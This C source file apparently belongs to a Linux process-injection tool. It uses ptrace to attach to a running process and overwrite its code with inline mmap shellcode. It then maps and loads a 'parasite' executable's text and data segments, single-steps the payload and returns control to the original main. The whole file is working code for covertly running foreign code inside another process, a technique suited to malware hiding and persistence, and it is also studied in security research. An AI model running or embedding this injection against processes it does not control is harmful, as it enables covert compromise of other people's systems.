#include "possess.h"

#define SHELLCODE_LEN 104
#define __NR_clone 56
#define __NR_mmap 9

extern int mmap_shellcode;

static unsigned long fixupAddr(unsigned long addr)
{
        unsigned long tmp, new;
        int diff;

        tmp = addr;
        diff = (tmp >> 20) - 4;
        new = 0x00C00000 >> 20;
        new += diff;
        new <<= 20;
        tmp &= ~0x00FF0000;
        tmp |= new;

        return tmp;
}

int dummy_func(void) {
 	
	/* SHELLCODE ALGORITHM
	 * Create anonymous mapping for text segment
	 mmap((void *)0x00C00000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, 
			MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0); 
	
	 * Create anonymous mapping for data segment
	 mmap((void *)0x00E00000, 0x4000, PROT_READ|PROT_WRITE|PROT_EXEC,
			MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0); 
	  
	 * Create anonymous mapping for Stack for new executable to use.
	 mmap((void *)0x00F0EE00, 0xF000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE|MAP_GROWSDOWN, -1, 0);
	 * NOTE: Make sure and set stack pointer to 0x00F0EE00 + 0xF000
	
	 * Create LWP/thread using clone, and assign it to main(). This is the second shellcode injection
	 * and can only be executed once we have the new executable loaded in its address space with a stack.
	 clone(<&address_of_main()>, <&address_of_stack>, SIGCHLD | CLONE_FS | CLONE_FILES |CLONE_SIGHAND | CLONE_VM, (void *)fd);
	*/
/* We actually patch the address and size that we mmap'ing */
/* As seen in inject_executable() */
	
   __asm__ volatile (
        ".globl mmap_shellcode\n"
        "mmap_shellcode:\n"
        "mov $0x00C00000, %rdi\n"
        "mov $0x1000, %rsi\n"
        "mov $0x7, %rdx\n"
        "mov $0x32, %r10\n"
        "mov $-1, %r8\n"
        "mov $0x0, %r9\n"
        "mov $9, %rax\n"
        "syscall\n"
        "mov $0x00E00000, %rdi\n"
	"mov $0x4000, %rsi\n"
	"mov $0x7, %rdx\n"
	"mov $0x32, %r10\n"
	"mov $-1, %r8\n"
	"mov $0x0, %r9\n"
	"mov $9, %rax\n"
	"syscall\n"
	"int3\n"
        );

}


int inject_executable(elfmap_t *elfmap, Elf64_Addr entry_point, Elf64_Addr orig_main)
{
	uint8_t shellcode[SHELLCODE_LEN + 4];
	int i;
	struct user_regs_struct pt_reg, pt_reg_orig;
	int status;
	unsigned char zeroes[0xe10] = { 0x90 };

	memcpy(shellcode, (uint8_t *)&mmap_shellcode, 104);
	
	elfmap->text_vaddr = fixupAddr(elfmap->text_vaddr);
	elfmap->data_vaddr = fixupAddr(elfmap->data_vaddr);
	
	printf("text vaddr of parasite: 0x%lx\n", elfmap->text_vaddr);
	printf("data vaddr of parasite: 0x%lx\n", elfmap->data_vaddr);
	*(uint32_t *)&shellcode[0x3] = elfmap->text_vaddr;
	*(uint32_t *)&shellcode[0xA] = (elfmap->text_size + PAGE_SIZE) & ~(PAGE_SIZE - 1);
	*(uint32_t *)&shellcode[0x36] = elfmap->data_vaddr & ~(PAGE_SIZE - 1);
	*(uint32_t *)&shellcode[0x3D] = (elfmap->data_size + PAGE_SIZE * 4) & ~(PAGE_SIZE - 1);
	
	printf("\n");
	pid_attach(globals.pid);
	printf("Injecting at 0x%lx in %d\n", elfmap->text_vaddr_orig, globals.pid);
	if (pid_write(globals.pid, elfmap->text_vaddr_orig, shellcode, SHELLCODE_LEN) < 0) {
		perror("pid_write");
		exit(-1);
	}
	
	ptrace(PTRACE_GETREGS, globals.pid, NULL, &pt_reg);

	/* Backup regs */
	memcpy(&pt_reg_orig, &pt_reg, sizeof(struct user_regs_struct));
	
	/* Zero out regs */
	memset(&pt_reg, 0, sizeof(struct user_regs_struct));
	
	/* Set IP to where shellcode is at (It overwrites initial ELF header (Which is fine)) */
	pt_reg.rip = elfmap->text_vaddr_orig;
	ptrace(PTRACE_SETREGS, globals.pid, NULL, &pt_reg);
	
	/* Execute shellcode */
	ptrace(PTRACE_CONT, globals.pid, NULL, NULL);
	wait(&status);
	
	/* Get control back from int3 */
	ptrace(PTRACE_GETREGS, globals.pid, NULL, &pt_reg);
	
	memset(&pt_reg, 0, sizeof(struct user_regs_struct));
	
	printf("[!] Loading text segment at 0x%lx\n", elfmap->text_vaddr);
	if (pid_write(globals.pid, elfmap->text_vaddr, elfmap->mem, elfmap->text_size) < 0) {
		perror("pid_write");
		exit(-1);
	}
	
	printf("[!] Loading data segment at 0x%lx\n", elfmap->data_vaddr & ~4095);
	/* Zero out the first bit */
	if (pid_write(globals.pid, elfmap->data_vaddr & ~4095, zeroes, 0xe10) < 0) {
		perror("pid_write");
		exit(-1);
	}
	
	/* Write actual data segment data */
	printf("[!] Actual data segment begins at 0x%lx\n", elfmap->data_vaddr);
	if (pid_write(globals.pid, elfmap->data_vaddr, &elfmap->mem[elfmap->data_offset], elfmap->data_size) < 0) {
		perror("pid_write");
		exit(-1);
	}
	
	
	printf("[!] Setting entry point to 0x%lx\n", elfmap->ehdr->e_entry);
	
	entry_point = fixupAddr(entry_point);
	printf("[!] Setting entry point to main@0x%lx\n", entry_point);

	pt_reg.rip = entry_point; //0xc0052c; //elfmap->ehdr->e_entry;
	
	ptrace(PTRACE_SETREGS, globals.pid, NULL, &pt_reg);
	/*
	ptrace(PTRACE_CONT, globals.pid, NULL, NULL);
	wait(&status);
	*/
	for (i = 0; i < elfmap->text_size * 3; i++) {
		ptrace(PTRACE_SINGLESTEP, globals.pid, NULL, NULL);
		wait(&status);
		ptrace(PTRACE_GETREGS, globals.pid, NULL, &pt_reg);
	}
		
	if (WIFSTOPPED(status)) {
		ptrace(PTRACE_GETREGS, globals.pid, NULL, &pt_reg);
		printf("Payload finished execution at instruction %llx\n", pt_reg.rip);
	}
	printf("[!] Passing control back to %lx\n", orig_main);
	
	memset(&pt_reg_orig, 0, sizeof(struct user_regs_struct));
	pt_reg_orig.rip = orig_main; //0x40057c;
	ptrace(PTRACE_SETREGS, globals.pid, NULL, &pt_reg_orig);
	ptrace(PTRACE_DETACH, globals.pid, NULL, NULL);
	/*
	ptrace(PTRACE_CONT, globals.pid, NULL, NULL);
	wait(&status);
	printf("Received control back\n");
	*/
}


